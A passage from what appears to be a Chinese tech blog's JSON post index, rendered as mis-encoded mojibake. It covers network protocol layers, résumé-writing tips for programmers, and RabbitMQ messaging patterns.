è¾“åè®®ï¼Œä¹Ÿä¸æ˜¯ä¸€ä»¶ç®€å•çš„äº‹æƒ…ã€‚ ç½‘ç»œå±‚å®é™…åœºæ™¯ä¸­çš„ç½‘ç»œç¯èŠ‚æ˜¯é”™ç»¼å¤æ‚çš„ï¼Œä¸­é—´æœ‰å„ç§å„æ ·çš„çº¿è·¯å’Œåˆ†å‰è·¯å£ï¼Œå¦‚æœä¸€ä¸ªè®¾å¤‡çš„æ•°æ®è¦ä¼ è¾“ç»™å¦ä¸€ä¸ªè®¾å¤‡ï¼Œå°±éœ€è¦åœ¨å„ç§å„æ ·çš„è·¯å¾„å’ŒèŠ‚ç‚¹è¿›è¡Œé€‰æ‹©ï¼Œè€Œä¼ è¾“å±‚çš„è®¾è®¡ç†å¿µæ˜¯ç®€å•ã€é«˜æ•ˆã€ä¸“æ³¨ï¼Œå¦‚æœä¼ è¾“å±‚è¿˜è´Ÿè´£è¿™ä¸€å—åŠŸèƒ½å°±æœ‰ç‚¹è¿èƒŒè®¾è®¡åŸåˆ™äº†ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ä¸å¸Œæœ›ä¼ è¾“å±‚åè®®å¤„ç†å¤ªå¤šçš„äº‹æƒ…ï¼Œåªéœ€è¦æœåŠ¡å¥½åº”ç”¨å³å¯ï¼Œè®©å…¶ä½œä¸ºåº”ç”¨é—´æ•°æ®ä¼ è¾“çš„åª’ä»‹ï¼Œå¸® åŠ©å®ç°åº”ç”¨åˆ°åº”ç”¨çš„é€šä¿¡ï¼Œè€Œå®é™…çš„ä¼ è¾“åŠŸèƒ½å°±äº¤ç»™ä¸‹ä¸€å±‚ï¼Œä¹Ÿå°±æ˜¯ç½‘ç»œå±‚(Internet Layer)ã€‚ ç½‘ç»œå±‚æœ€å¸¸ä½¿ç”¨çš„æ˜¯ IP åè®®(Internet Protocol)ï¼ŒIP åè®®ä¼šå°†ä¼ è¾“å±‚çš„æŠ¥æ–‡ä½œä¸ºæ•°æ®éƒ¨åˆ†ï¼Œå†åŠ ä¸Š IP åŒ…å¤´ç»„è£… æˆ IP æŠ¥æ–‡ï¼Œå¦‚æœ IP æŠ¥æ–‡å¤§å°è¶…è¿‡ MTU(ä»¥å¤ªç½‘ä¸­ä¸€èˆ¬ä¸º 1500 å­—èŠ‚)å°±ä¼šå†æ¬¡è¿›è¡Œåˆ†ç‰‡ï¼Œå¾—åˆ°ä¸€ä¸ªå³å°†å‘é€åˆ°ç½‘ ç»œçš„ IP æŠ¥æ–‡ã€‚ ç½‘ç»œå±‚è´Ÿè´£å°†æ•°æ®ä»ä¸€ä¸ªè®¾å¤‡ä¼ è¾“åˆ°å¦ä¸€ä¸ªè®¾å¤‡ï¼Œä¸–ç•Œä¸Šé‚£ä¹ˆå¤šè®¾å¤‡ï¼Œåˆè¯¥å¦‚ä½•æ‰¾åˆ°å¯¹æ–¹å‘¢?å› æ­¤ï¼Œç½‘ç»œå±‚éœ€è¦æœ‰åŒºåˆ†è®¾å¤‡çš„ç¼–å·ã€‚ æˆ‘ä»¬ä¸€èˆ¬ç”¨ IP åœ°å€ç»™è®¾å¤‡è¿›è¡Œç¼–å·ï¼Œå¯¹äº IPv4 åè®®ï¼Œ IP åœ°å€å…± 32 ä½ï¼Œåˆ†æˆäº†å››æ®µï¼Œæ¯æ®µæ˜¯ 8 ä½ã€‚åªæœ‰ä¸€ä¸ªå•çº¯ çš„ IP åœ°å€è™½ç„¶åšåˆ°äº†åŒºåˆ†è®¾å¤‡ï¼Œä½†æ˜¯å¯»å€èµ·æ¥å°±ç‰¹åˆ«éº»çƒ¦ï¼Œå…¨ä¸–ç•Œé‚£ä¹ˆå¤šå°è®¾å¤‡ï¼Œéš¾é“ä¸€ä¸ªä¸€ä¸ªå»åŒ¹é…?è¿™æ˜¾ç„¶ ä¸ç§‘å­¦ã€‚ å› æ­¤ï¼Œéœ€è¦å°† IP åœ°å€åˆ†æˆä¸¤ç§æ„ä¹‰ï¼š ä¸€ä¸ªæ˜¯ç½‘ç»œå·ï¼Œè´Ÿè´£æ ‡è¯†è¯¥ IP åœ°å€æ˜¯å±äºå“ªä¸ªå­ç½‘çš„; ä¸€ä¸ªæ˜¯ä¸»æœºå·ï¼Œè´Ÿè´£æ ‡è¯†åŒä¸€å­ç½‘ä¸‹çš„ä¸åŒä¸»æœº; æ€ä¹ˆåˆ†çš„å‘¢?è¿™éœ€è¦é…åˆå­ç½‘æ©ç æ‰èƒ½ç®—å‡º IP åœ°å€ çš„ç½‘ç»œå·å’Œä¸»æœºå·ã€‚é‚£ä¹ˆåœ¨å¯»å€çš„è¿‡ç¨‹ä¸­ï¼Œå…ˆåŒ¹é…åˆ°ç›¸åŒçš„ç½‘ç»œå·ï¼Œæ‰ä¼šå»æ‰¾å¯¹åº”çš„ä¸»æœºã€‚ é™¤äº†å¯»å€èƒ½åŠ›ï¼Œ IP åè®®è¿˜æœ‰å¦ä¸€ä¸ªô°€è¦çš„èƒ½åŠ›å°±æ˜¯è·¯ç”±ã€‚å®é™…åœºæ™¯ä¸­ï¼Œä¸¤å°è®¾å¤‡å¹¶ä¸æ˜¯ç”¨ä¸€æ¡ç½‘çº¿è¿æ¥èµ·æ¥çš„ï¼Œ è€Œæ˜¯é€šè¿‡å¾ˆå¤šç½‘å…³ã€è·¯ç”±å™¨ã€äº¤æ¢æœºç­‰ä¼—å¤šç½‘ç»œè®¾å¤‡è¿æ¥èµ·æ¥çš„ï¼Œé‚£ä¹ˆå°±ä¼šå½¢æˆå¾ˆå¤šæ¡ç½‘ç»œçš„è·¯å¾„ï¼Œå› æ­¤å½“æ•°æ®åŒ… åˆ°è¾¾ä¸€ä¸ªç½‘ç»œèŠ‚ç‚¹ï¼Œå°±éœ€è¦é€šè¿‡ç®—æ³•å†³å®šä¸‹ä¸€æ­¥èµ°å“ªæ¡è·¯å¾„ã€‚ æ‰€ä»¥ï¼ŒIP åè®®çš„å¯»å€ä½œç”¨æ˜¯å‘Šè¯‰æˆ‘ä»¬å»å¾€ä¸‹ä¸€ä¸ªç›®çš„åœ°è¯¥æœå“ªä¸ªæ–¹å‘èµ°ï¼Œè·¯ç”±åˆ™æ˜¯æ ¹æ®ã€Œä¸‹ä¸€ä¸ªç›®çš„åœ°ã€é€‰æ‹©è·¯ å¾„ã€‚å¯»å€æ›´åƒåœ¨å¯¼èˆªï¼Œè·¯ç”±æ›´åƒåœ¨æ“ä½œæ–¹å‘ç›˜ã€‚ æ•°æ®é“¾è·¯å±‚å®é™…åœºæ™¯ä¸­ï¼Œç½‘ç»œå¹¶ä¸æ˜¯ä¸€ä¸ªæ•´ä½“ï¼Œæ¯”å¦‚ä½ å®¶å’Œæˆ‘å®¶å°±ä¸å±äºä¸€ä¸ªç½‘ç»œï¼Œæ‰€ä»¥æ•°æ®ä¸ä»…å¯ä»¥åœ¨åŒä¸€ä¸ªç½‘ç»œä¸­è®¾å¤‡é—´è¿›è¡Œä¼ è¾“ï¼Œä¹Ÿå¯ä»¥è·¨ç½‘ç»œè¿›è¡Œä¼ è¾“ã€‚ ä¸€æ—¦æ•°æ®éœ€è¦è·¨ç½‘ç»œä¼ è¾“ï¼Œå°±éœ€è¦æœ‰ä¸€ä¸ªè®¾å¤‡åŒæ—¶åœ¨ä¸¤ä¸ªç½‘ç»œå½“ä¸­ï¼Œè¿™ä¸ªè®¾å¤‡ä¸€èˆ¬æ˜¯è·¯ç”±å™¨ï¼Œè·¯ç”±å™¨å¯ä»¥é€šè¿‡è·¯ç”± è¡¨è®¡ç®—å‡ºä¸‹ä¸€ä¸ªè¦å»çš„ IP åœ°å€ã€‚ é‚£é—®é¢˜æ¥äº†ï¼Œè·¯ç”±å™¨æ€ä¹ˆçŸ¥é“è¿™ä¸ª IP åœ°å€æ˜¯å“ªä¸ªè®¾å¤‡çš„å‘¢? äºæ˜¯ï¼Œå°±éœ€è¦æœ‰ä¸€ä¸ªä¸“â»”çš„å±‚æ¥æ ‡è¯†ç½‘ç»œä¸­çš„è®¾å¤‡ï¼Œè®©æ•°æ®åœ¨ä¸€ä¸ªé“¾è·¯ä¸­ä¼ è¾“ï¼Œè¿™å°±æ˜¯æ•°æ®é“¾è·¯å±‚(Data Link Layer)ï¼Œå®ƒä¸»è¦ä¸ºç½‘ç»œå±‚æä¾›é“¾è·¯çº§åˆ«ä¼ è¾“çš„æœåŠ¡ã€‚ æ¯ä¸€å°è®¾å¤‡çš„ç½‘å¡éƒ½ä¼šæœ‰ä¸€ä¸ª MAC åœ°å€ï¼Œå®ƒå°±æ˜¯ç”¨æ¥å”¯ä¸€æ ‡è¯†è®¾å¤‡çš„ã€‚è·¯ç”±å™¨è®¡ç®—å‡ºäº†ä¸‹ä¸€ä¸ªç›®çš„åœ° IP åœ°å€ï¼Œå† é€šè¿‡ ARP åè®®æ‰¾åˆ°è¯¥ç›®çš„åœ°çš„ MAC åœ°å€ï¼Œè¿™æ ·å°±çŸ¥é“è¿™ä¸ª IP åœ°å€æ˜¯å“ªä¸ªè®¾å¤‡çš„äº†ã€‚ ç½‘ç»œå±‚ä¸æ•°æ®é“¾è·¯å±‚æœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Ÿ Mac çš„ä½œç”¨æ˜¯å®ç°ã€ç›´è¿ã€çš„ä¸¤ä¸ªè®¾å¤‡ä¹‹é—´çš„é€šä¿¡ï¼Œè€Œ IP åˆ™è´Ÿè´£åœ¨ã€æ²¡æœ‰ç›´è¿ã€çš„ä¸¤ä¸ªç½‘ç»œä¹‹é—´è¿›è¡Œé€šä¿¡ä¼ è¾“ã€‚ ç‰©ç†å±‚å½“æ•°æ®å‡†å¤‡è¦ä»è®¾å¤‡å‘é€åˆ°ç½‘ç»œæ—¶ï¼Œéœ€è¦æŠŠæ•°æ®åŒ…è½¬æ¢æˆç”µä¿¡å·ï¼Œè®©å…¶å¯ä»¥åœ¨ç‰©ç†ä»‹è´¨ä¸­ä¼ è¾“ï¼Œè¿™ä¸€å±‚å°±æ˜¯ç‰©ç†å±‚ (Physical Layer)ï¼Œå®ƒä¸»è¦æ˜¯ä¸ºæ•°æ®é“¾è·¯å±‚æä¾›äºŒè¿›åˆ¶ä¼ è¾“çš„æœåŠ¡ã€‚ æ€»ç»“ç½‘ç»œåè®®é€šå¸¸æ˜¯ä»ä¸Šåˆ°ä¸‹ï¼Œåˆ†æˆäº”å±‚ï¼Œåˆ†åˆ«æ˜¯åº”ç”¨å±‚ã€ä¼ è¾“å±‚ã€ç½‘ç»œå±‚ã€æ•°æ®é“¾è·¯å±‚ã€ç‰©ç†å±‚ã€‚ åº”ç”¨å±‚ï¼šä¸ºåº”ç”¨ç¨‹åºæä¾›æœåŠ¡ï¼Œå¹¶è§„å®šåº”ç”¨ç¨‹åºä¸­é€šä¿¡ç›¸å…³çš„ç»†èŠ‚ã€‚åŒ…æ‹¬ï¼ˆæ–‡ä»¶ä¼ è¾“FTPã€ç”µå­é‚®ä»¶SMTPã€è¿œç¨‹ç™»å½•SSHï¼‰ç­‰åè®® ä¼ è¾“å±‚ï¼šèµ·ç€å¯é ä¼ è¾“çš„ä½œç”¨ã€‚åªåœ¨é€šä¿¡åŒæ–¹èŠ‚ç‚¹ä¸Šè¿›è¡Œå¤„ç†ï¼Œè€Œæ— éœ€åœ¨è·¯ç”±å™¨ä¸Šå¤„ç†ã€‚ ç½‘ç»œå±‚ï¼šå°†æ•°æ®ä¼ è¾“åˆ°ç›®æ ‡åœ°å€ï¼Œç›®æ ‡åœ°å€å¯ä»¥æ˜¯å¤šä¸ªç½‘ç»œé€šè¿‡è·¯ç”±å™¨è¿æ¥è€Œæˆçš„æŸä¸€ä¸ªåœ°å€ã€‚å› æ­¤è¿™ä¸€å±‚ä¸»è¦è´Ÿè´£å¯»å€å’Œè·¯ç”±é€‰æ‹©ã€‚ æ•°æ®é“¾è·¯å±‚ï¼šè´Ÿè´£ç‰©ç†å±‚é¢ä¸Šçš„äº’è”çš„ã€èŠ‚ç‚¹ä¹‹é—´çš„é€šä¿¡ä¼ è¾“ã€‚ ç‰©ç†å±‚ï¼šæŠŠæ•°æ®åŒ…è½¬æ¢æˆç”µä¿¡å·ï¼Œè®©å…¶å¯ä»¥åœ¨ç‰©ç†ä»‹è´¨ä¸­ä¼ è¾“ã€‚ å‚è€ƒé“¾æ¥ å›¾è§£ç½‘ç»œâ€”â€”å°æ—coding","categories":[{"name":"è®¡ç®—æœºç½‘ç»œ","slug":"è®¡ç®—æœºç½‘ç»œ","permalink":"https://www.0x2beace.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"è®¡ç®—æœºç½‘ç»œ","slug":"è®¡ç®—æœºç½‘ç»œ","permalink":"https://www.0x2beace.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"ç¨‹åºå‘˜å¦‚ä½•å†™å¥½ç®€å†","slug":"how-to-write-a-good-resume-for-programmers","date":"2022-10-01T06:48:48.000Z","updated":"2023-02-18T03:28:33.602Z","comments":true,"path":"how-to-write-a-good-resume-for-programmers/","link":"","permalink":"https://www.0x2beace.com/how-to-write-a-good-resume-for-programmers/","excerpt":"ç®€å†å°±æ˜¯ä¸€å—æ•²é—¨ç –ï¼Œå°±ç®—æŠ€æœ¯å¾ˆå¥½ï¼Œä½†æ˜¯ç®€å†å†™å¾—ä¸å¥½çš„è¯ï¼Œä¹Ÿæ˜¯å¾—ä¸åˆ°è®¤å¯çš„ï¼Œè·å–ä¸åˆ°é¢è¯•æœºä¼šçš„ã€‚","text":"ç®€å†å°±æ˜¯ä¸€å—æ•²é—¨ç –ï¼Œå°±ç®—æŠ€æœ¯å¾ˆå¥½ï¼Œä½†æ˜¯ç®€å†å†™å¾—ä¸å¥½çš„è¯ï¼Œä¹Ÿæ˜¯å¾—ä¸åˆ°è®¤å¯çš„ï¼Œè·å–ä¸åˆ°é¢è¯•æœºä¼šçš„ã€‚ é‚£ä¹ˆä»€ä¹ˆæ ·çš„ç®€å†ç®—å†™å¾—ä¸å¥½å‘¢ï¼Ÿ å‘½ä¸­ä¸‹é¢çš„å¤šæ¡ ç®€å†æ ·å¼ä¸ç»Ÿä¸€ï¼Œå°½é‡å°‘åœ¨ç®€å†ä¸­ä½¿ç”¨è¡¨æ ¼ æ–‡å­—æ ·å¼ä¸è¦èŠ±é‡Œèƒ¡å“¨ ç®€å†ä¸­ä¸€å®šè¦å±•ç¤ºæŠ€æœ¯æ ˆï¼ˆæŠ€èƒ½æ¸…å•ï¼‰ï¼Œä½†æ˜¯ä¸è¦æ˜¯å•è¯æœ¬ ä¸ªäººè¯„ä»·ï¼ˆä¸ªäººæ€»ç»“ï¼‰ä¸è¦å†™ä¸€äº›è™šçš„ä¸œè¥¿ï¼Œæ¯”å¦‚ä¸ºäººæ€§æ ¼ã€è¯šå®è°¦è™šã€å‹¤å¥‹ã€èƒ½åƒè‹¦è€åŠ³ã€æœ‰è€å¿ƒè¿™ç±»çœ‹ä¸å‡ºä¼˜ç‚¹ç‰¹é•¿çš„å¥å­ ä¸ç®¡å·¥ä½œå¤šä¹…ï¼Œç®€å†ä¸Šçš„é¡¹ç›®åªéœ€è¦ä¸‰å››ä¸ªï¼Œä¸éœ€è¦æ— æ„ä¹‰è¿›è¡Œå †ç Œ é¡¹ç›®ä»‹ç»ç¯‡å¹…ä¸è¦è¿‡é•¿ï¼Œæ³¨æ„æ’ç‰ˆ æœ‰é”™åˆ«å­— åŸºæœ¬ä¿¡æ¯ç®€å†ä¸€å®šå†™ä¸Šè‡ªå·±çš„åŸºæœ¬ä¿¡æ¯ã€‚ ä¸€èˆ¬åŸºæœ¬ä¿¡æ¯åŒ…æ‹¬å§“åã€ç”µè¯ã€ç”µå­é‚®ç®±ã€è´¯ç±ã€æ±‚èŒæ„å‘ã€å·¥ä½œå¹´é™ã€å¹´é¾„ã€åœ¨èŒçŠ¶æ€ã€å­¦å†ç­‰è¿™å‡ éƒ¨åˆ†ã€‚ æŠ€æœ¯æ ˆæŠ€æœ¯æ ˆä¸èƒ½æ˜¯å•è¯æœ¬ï¼Œè¦å‡¸æ˜¾æŠ€æœ¯ç»†èŠ‚ï¼ŒæŠŠä½ ç°åœ¨ä¼šçš„ã€å·²ç»æŒæ¡çš„ï¼Œå°½å¯èƒ½å¤šåœ°é™ˆè¿°ç»™é¢è¯•å®˜ã€‚ é”™è¯¯çš„æ‰“å¼€æ–¹å¼ï¼š æ­£ç¡®çš„æ‰“å¼€æ–¹å¼ï¼š ä¸ªäººè¯„ä»·ä¸ªäººè¯„ä»·è¿™ä¸€å—å¾ˆé‡è¦ï¼Œä½†æ˜¯å¾€å¾€å¾ˆå¤šäººçš„å†™æ³•éƒ½æ˜¯æœ‰é—®é¢˜çš„ï¼Œå®Œå…¨çœ‹ä¸å‡ºä¸ªæ€§ç‰¹ç‚¹ï¼Œå†™å’Œæ²¡å†™æ²¡ä»€ä¹ˆåŒºåˆ«ã€‚ é”™è¯¯çš„æ‰“å¼€æ–¹å¼ï¼š ä¸ºäººæ€§æ ¼ï¼Œè¯šå®è°¦è™šï¼Œå‹¤å¥‹ï¼Œèƒ½åƒè‹¦è€åŠ³ï¼Œæœ‰è€å¿ƒï¼Œæœ‰å›¢é˜Ÿæ„è¯†ï¼Œèƒ½å’ŒåŒäº‹å’Œè°ç›¸å¤„ï¼Œèƒ½è™šå¿ƒæ¥å—åˆ«äººçš„å»ºè®®çš„äºº è´£ä»»å¿ƒå¼ºï¼Œå–„äºæ²Ÿé€šï¼Œå…·æœ‰è‰¯å¥½çš„å›¢é˜Ÿåˆä½œç²¾ç¥ï¼›ä¸“ä¸šæ‰å®ï¼Œå…·æœ‰è¾ƒå¼ºçš„é’»ç ”ç²¾ç¥å’Œå­¦ä¹ èƒ½åŠ›ï¼›æ€§æ ¼æ¯”è¾ƒä¹è§‚å¤–å‘ æ­£ç¡®çš„æ‰“å¼€æ–¹å¼ï¼š ä¸‰å¹´å¼€å‘ç»éªŒï¼Œæ‹¥æœ‰ä¸€çº¿äº’è”ç½‘é¡¹ç›®æ¶æ„è®¾è®¡ä¸ç ”å‘ç»éªŒï¼Œå‚ä¸è¿‡ç™¾ä¸‡çº§ç”¨æˆ·ï¼Œæ—¥æ´»ä¸‡çº§ç¤¾äº¤ç³»ç»Ÿå¼€å‘ äº”å¹´å¼€å‘ç»éªŒï¼Œå…¶ä¸­ä¸‰å¹´ä»¥ä¸Šå¤§å‹ç³»ç»Ÿæ¶æ„è®¾è®¡ç»éªŒï¼Œä»¥åŠä¸‰å¹´ä»¥ä¸Šçš„å›¢é˜Ÿç®¡ç†ç»éªŒï¼Œå…·æœ‰åˆ†å¸ƒå¼ã€é«˜å¹¶å‘ã€é«˜å¯ç”¨ã€å¤§æ•°æ®é‡çš„ç³»ç»Ÿæ¶æ„è®¾è®¡ä»¥åŠç ”å‘ç»éªŒ é¡¹ç›®ç»éªŒä¸ç®¡å·¥ä½œå¤šä¹…ï¼Œç®€å†ä¸Šçš„é¡¹ç›®åªéœ€è¦ä¸‰å››ä¸ªï¼Œä¸éœ€è¦å‡‘å­—æ•°ï¼Œæ¯”å¦‚ä¸€äº›è€é¡¹ç›®ï¼Œæ²¡æœ‰äº®ç‚¹çš„é¡¹ç›®ï¼Œå°±ä¸è¦å†™ä¸Šå»ã€‚ é¡¹ç›®ä»‹ç»ç¯‡å¹…ä¸è¦è¿‡é•¿ï¼Œæ³¨æ„æ–‡å­—æ’ç‰ˆ é¡¹ç›®æœ‰ä»€ä¹ˆä½œç”¨ï¼Œæœ‰ä»€ä¹ˆäº®ç‚¹ï¼Œä¸»è¦è§£å†³ä»€ä¹ˆé—®é¢˜ï¼ˆå°½é‡çªå‡ºé¡¹ç›®ç»éªŒã€æŠ€æœ¯èƒŒæ™¯ã€æŠ€æœ¯ä¼˜åŠ¿ã€è¡Œä¸šæ·±åº¦ï¼‰ å‡¸æ˜¾å‡ºæ¥ä½ åœ¨å½“å‰é¡¹ç›®é‡Œé¢åˆ°åº•åšä»€ä¹ˆäº‹æƒ…ï¼Œåœ¨é¡¹ç›®ä¸­çš„æ ¸å¿ƒä½œç”¨ï¼Œä»·å€¼åœ¨ä»€ä¹ˆåœ°æ–¹ é”™è¯¯çš„æ‰“å¼€æ–¹å¼ï¼š æ­£ç¡®çš„æ‰“å¼€æ–¹å¼ï¼š æœ€åä¸è¦å®³æ€•å†™ç®€å†ï¼Œä¸è¦æ•·è¡å†™ç®€å†ï¼Œç®€å†ä¸Šä¸€å®šä¸è¦æœ‰é”™åˆ«å­—ï¼Œè¿™ä¸ªå¾ˆå½±å“ç¬¬ä¸€å°è±¡ã€‚ å†™åœ¨ç®€å†ä¸Šçš„ä»»ä½•å†…å®¹ï¼Œéƒ½æ˜¯æœ‰å¯èƒ½è¢«é—®åˆ°çš„ï¼Œæ‰€ä»¥è¦æå‰åšå¥½åŠŸè¯¾ï¼Œä¸æ‰“æ²¡æœ‰å‡†å¤‡çš„ä»—ã€‚ æ‰¾å·¥ä½œåº”è¯¥æŠ±ç€æ€æ ·çš„å¿ƒæ€ï¼Ÿ ä¸ç®¡è¿™å®¶å…¬å¸çš„é¢è¯•èƒ½ä¸èƒ½è¿‡ï¼Œä½†æœ€èµ·ç è¦æŠŠé¢è¯•çš„æœºä¼šäº‰å–åˆ°","categories":[{"name":"ä¸€äº›ç»éªŒ","slug":"ä¸€äº›ç»éªŒ","permalink":"https://www.0x2beace.com/categories/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"ä¸€äº›ç»éªŒ","slug":"ä¸€äº›ç»éªŒ","permalink":"https://www.0x2beace.com/tags/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"}]},{"title":"RabbitMQ å¸¸è§çš„å·¥ä½œæ¨¡å¼","slug":"rabbitmq-common-working-mode","date":"2022-09-17T04:53:46.000Z","updated":"2023-02-18T03:28:33.605Z","comments":true,"path":"rabbitmq-common-working-mode/","link":"","permalink":"https://www.0x2beace.com/rabbitmq-common-working-mode/","excerpt":"è¿™ç¯‡ç¬”è®°ä¸»è¦ç”¨æ¥ä»‹ç» RabbitMQ å¸¸è§çš„å‡ ç§å·¥ä½œæ¨¡å¼ã€‚","text":"è¿™ç¯‡ç¬”è®°ä¸»è¦ç”¨æ¥ä»‹ç» RabbitMQ å¸¸è§çš„å‡ ç§å·¥ä½œæ¨¡å¼ã€‚ äº”ç§å·¥ä½œæ¨¡å¼ç®€å•æ¨¡å¼æœ€ç®€å•çš„å·¥ä½œé˜Ÿåˆ—ï¼Œå…¶ä¸­ä¸€ä¸ªæ¶ˆæ¯ç”Ÿäº§è€…ï¼Œä¸€ä¸ªæ¶ˆæ¯æ¶ˆè´¹è€…ï¼Œä¸€ä¸ªé˜Ÿåˆ—ã€‚ä¹Ÿç§°ä¸ºç‚¹å¯¹ç‚¹æ¨¡å¼ ä¸€ä¸ªç”Ÿäº§è€… P å‘é€æ¶ˆæ¯åˆ°é˜Ÿåˆ— Qï¼Œä¸€ä¸ªæ¶ˆè´¹è€… C è¿›è¡Œæ¥æ”¶ã€‚ å·¥ä½œæ¨¡å¼ä¸€ä¸ªæ¶ˆæ¯ç”Ÿäº§è€…ï¼Œä¸€ä¸ªäº¤æ¢å™¨ï¼Œä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¤šä¸ªæ¶ˆè´¹è€…ã€‚åŒæ ·ä¹Ÿç§°ä¸ºç‚¹å¯¹ç‚¹æ¨¡å¼ ç”Ÿäº§è€… P å‘é€æ¶ˆæ¯åˆ°é˜Ÿåˆ—ï¼Œå¤šä¸ªæ¶ˆè´¹è€… C æ¶ˆè´¹é˜Ÿåˆ—çš„æ•°æ®ã€‚ å·¥ä½œé˜Ÿåˆ—ä¹Ÿç§°ä¸ºå…¬å¹³æ€§é˜Ÿåˆ—æ¨¡å¼ï¼Œå¾ªç¯åˆ†å‘ï¼ŒRabbitMQ å°†æŒ‰é¡ºåºå°†æ¯æ¡æ¶ˆæ¯å‘é€ç»™ä¸‹ä¸€ä¸ªæ¶ˆè´¹è€…ï¼Œæ¯ä¸ªæ¶ˆè´¹è€…å°†è·å¾—ç›¸åŒæ•°é‡çš„æ¶ˆæ¯ã€‚ å‘å¸ƒè®¢é˜…æ¨¡å¼ä¸€ä¸ªæ¶ˆæ¯ç”Ÿäº§è€…ï¼Œä¸€ä¸ªäº¤æ¢æœºï¼ˆäº¤æ¢æœºç±»å‹ä¸ºfanoutï¼‰ï¼Œå¤šä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¤šä¸ªæ¶ˆè´¹è€…ã€‚ç§°ä¸ºå‘å¸ƒ/è®¢é˜…æ¨¡å¼ åœ¨åº”ç”¨ä¸­ï¼Œåªéœ€è¦ç®€å•çš„å°†é˜Ÿåˆ—ç»‘å®šåˆ°äº¤æ¢æœºä¸Šã€‚ä¸€ä¸ªå‘é€åˆ°äº¤æ¢æœºçš„æ¶ˆæ¯éƒ½ä¼šè¢«è½¬å‘åˆ°ä¸è¯¥äº¤æ¢æœºç»‘å®šçš„æ‰€æœ‰é˜Ÿåˆ—ä¸Šã€‚å¾ˆåƒå­ç½‘å¹¿æ’­ï¼Œæ¯å°å­ç½‘å†…çš„ä¸»æœºéƒ½è·å¾—äº†ä¸€ä»½å¤åˆ¶çš„æ¶ˆæ¯ã€‚ ç”Ÿäº§è€… P åªéœ€æŠŠæ¶ˆæ¯å‘é€åˆ°äº¤æ¢æœºXï¼Œç»‘å®šè¿™ä¸ªäº¤æ¢æœºçš„é˜Ÿåˆ—éƒ½ä¼šè·å¾—ä¸€ä»½ä¸€æ ·çš„æ•°æ®ã€‚ è·¯ç”±æ¨¡å¼åœ¨å‘å¸ƒ/è®¢é˜…æ¨¡å¼çš„åŸºç¡€ä¸Šï¼Œæœ‰é€‰æ‹©çš„æ¥æ”¶æ¶ˆæ¯ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡ routing è·¯ç”±è¿›è¡ŒåŒ¹é…æ¡ä»¶æ˜¯å¦æ»¡è¶³æ¥æ”¶æ¶ˆæ¯ã€‚ åœ¨è·¯ç”±æ¨¡å¼ä¸‹ï¼Œä¼šæŠŠæ¶ˆæ¯è·¯ç”±åˆ°å“ªäº› binding key ä¸ routing key å®Œå…¨åŒ¹é…çš„ Queueã€‚ ç”Ÿäº§è€…På‘é€æ•°æ®æ˜¯è¦æŒ‡å®šäº¤æ¢æœº(Xï¼‰å’Œroutingå‘é€æ¶ˆæ¯ ï¼ŒæŒ‡å®šçš„routingKey=errorï¼Œåˆ™é˜Ÿåˆ—Q1å’Œé˜Ÿåˆ—Q2éƒ½ä¼šæœ‰ä¸€ä»½æ•°æ®ï¼Œå¦‚æœæŒ‡å®šroutingKey=into,æˆ–=warningï¼Œäº¤æ¢æœº(X)åªä¼šæŠŠæ¶ˆæ¯å‘åˆ°Q2é˜Ÿåˆ—ã€‚ ä¸»é¢˜æ¨¡å¼ä¸»é¢˜æ¨¡å¼å’Œè·¯ç”±æ¨¡å¼ç±»ä¼¼ï¼Œåªä¸è¿‡è·¯ç”±æ¨¡å¼æ˜¯æŒ‡å®šå›ºå®šçš„è·¯ç”±é”® routingKeyï¼Œè€Œä¸»é¢˜æ¨¡å¼æ˜¯å¯ä»¥æ¨¡ç³ŠåŒ¹é…è·¯ç”±é”® routingKeyï¼Œç±»ä¼¼äºSQLä¸­ = å’Œ like çš„å…³ç³»ã€‚ æ­»ä¿¡é˜Ÿåˆ—DLX å…¨ç§°æ˜¯ Dead-Letter-Exchangeï¼Œæ­»ä¿¡äº¤æ¢æœºã€‚ å½“ä¸€ä¸ªé˜Ÿåˆ—ä¸­çš„æ¶ˆæ¯å˜æˆæ­»ä¿¡ä¹‹åï¼Œä¼šè¢«é‡æ–°å‘é€åˆ°å¦ä¸€ä¸ªäº¤æ¢æœºï¼Œè¿™ä¸ªäº¤æ¢æœºå°±æ˜¯ DLXï¼Œè€Œç»‘å®š DLX çš„é˜Ÿåˆ—å°±æ˜¯æ­»ä¿¡é˜Ÿåˆ—ã€‚ ä»€ä¹ˆæƒ…å†µä¸‹ä¼šå˜æˆæ­»ä¿¡å‘¢ï¼Ÿ æ¶ˆæ¯è¢«æ‹’ç» æ¶ˆæ¯è¿‡æœŸ é˜Ÿåˆ—è¾¾åˆ°æœ€å¤§é•¿åº¦ å»¶æ—¶é˜Ÿåˆ—å°±æ˜¯å½“æ¶ˆæ¯å‘é€ä»¥åï¼Œå¹¶ä¸æƒ³è®©æ¶ˆè´¹è€…ç«‹åˆ»æ‹¿åˆ°æ¶ˆæ¯ï¼Œè€Œæ˜¯ç­‰å¾…ç‰¹å®šæ—¶é—´åæ¶ˆè´¹è€…æ‰èƒ½æ‹¿åˆ°æ¶ˆæ¯æ¥æ¶ˆè´¹ã€‚ å»¶æ—¶åŠŸèƒ½å¯ä»¥é€šè¿‡è®¾ç½®è¿‡æœŸæ—¶é—´ï¼ˆTTLï¼‰+æ­»ä¿¡é˜Ÿåˆ—ï¼ˆDLXï¼‰æ¥å®ç°ã€‚ å½“å·²ç»å­˜åœ¨ä¸€ä¸ªé˜Ÿåˆ—äº†ï¼Œæ­¤æ—¶å†æ¬¡å£°æ˜ç›¸åŒåç§°çš„é˜Ÿåˆ—æ—¶ï¼Œå¦‚æœå±æ€§ä¸ä¸€è‡´ï¼Œå°±ä¼šå‡ºç°é”™è¯¯ã€‚ inequivalent arg â€˜x-message-ttlâ€™ for queue è§£å†³åŠæ³•å°±æ˜¯ï¼Œåˆ 